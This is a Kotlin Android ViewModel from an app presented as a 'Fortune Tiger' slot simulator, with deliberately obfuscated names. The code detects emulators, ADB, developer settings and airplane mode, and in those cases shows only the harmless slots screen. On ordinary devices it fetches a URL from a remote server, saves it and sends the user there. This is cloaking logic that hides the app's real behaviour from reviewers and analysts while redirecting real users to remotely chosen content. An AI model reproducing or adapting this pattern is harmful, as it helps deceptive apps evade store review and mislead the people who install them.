@file:SuppressLint("StaticFieldLeak")

package com.FortuneTiger.FT.Simul.controller

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.FortuneTiger.FT.Simul.AMdslfjAOeoruewur
import com.FortuneTiger.FT.Simul.BuildConfig
import com.FortuneTiger.FT.Simul.data.KeitaApi
import dagger.hilt.android.lifecycle.HiltViewModel
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class SAkjdhiweIUiyds @Inject constructor(
    @ApplicationContext private val sdjfkw: Context,
    private val requesterApiKeita : KeitaApi
) : ViewModel() {

    private val _eventsFlowControl: MutableSharedFlow<SDlfkjwoerweOIU> = MutableSharedFlow()
    val eventsFlowControl: SharedFlow<SDlfkjwoerweOIU> = _eventsFlowControl.asSharedFlow()

    fun mzxbcdf() {
        Log.d("TAG", "regulating")
        val oqiewu = Build.FINGERPRINT.contains("generic")
        val xbsdf = Settings.System.getInt(sdjfkw.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0) != 0
        val ajsdh = Settings.Secure.getInt(sdjfkw.contentResolver, Settings.Secure.ADB_ENABLED, 0) == 1
        val iuwqye = Settings.Secure.getInt(sdjfkw.contentResolver, Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1

        if (oqiewu || xbsdf || ajsdh || iuwqye) {
            viewModelScope.launch {
                delay(300)
                _eventsFlowControl.emit(SDlfkjwoerweOIU.EventToSlots)
            }
            return
        }
        keitaRequest()
    }

    private fun keitaRequest() {
        viewModelScope.launch(Dispatchers.IO + coroutineExceptionHandler) {
            val iweuyr = requesterApiKeita.grayAskAp(BuildConfig.URL)
            Log.d("TAG", "response = $iweuyr")
            when {
                !iweuyr.isSuccessful && iweuyr.code() == 404 -> _eventsFlowControl.emit(SDlfkjwoerweOIU.EventToSlots)
                !iweuyr.isSuccessful -> {
                    _eventsFlowControl.emit(SDlfkjwoerweOIU.EventToReconnect("response not succcess"))
                }
                iweuyr.isSuccessful && iweuyr.code() == 200 -> {
                    iweuyr.body()?.let { url ->
                        val sp = sdjfkw.getSharedPreferences(AMdslfjAOeoruewur.SP_NAME, Context.MODE_PRIVATE)
                        sp.edit().apply {
                            putString(AMdslfjAOeoruewur.SP_KEY, url)
                            apply()
                        }
                        _eventsFlowControl.emit(SDlfkjwoerweOIU.EventToTarget(url))

                    } ?: _eventsFlowControl.emit(SDlfkjwoerweOIU.EventToReconnect("body empty"))
                }
                iweuyr.isSuccessful -> {
                    _eventsFlowControl.emit(SDlfkjwoerweOIU.EventToReconnect("response code = ${iweuyr.code()}"))
                }
            }
        }
    }

    private val coroutineExceptionHandler = CoroutineExceptionHandler { _, e ->
        Log.d("TAG", "e : ${e.message}")
        viewModelScope.launch { _eventsFlowControl.emit(SDlfkjwoerweOIU.EventToReconnect(e.message.toString())) }
    }
}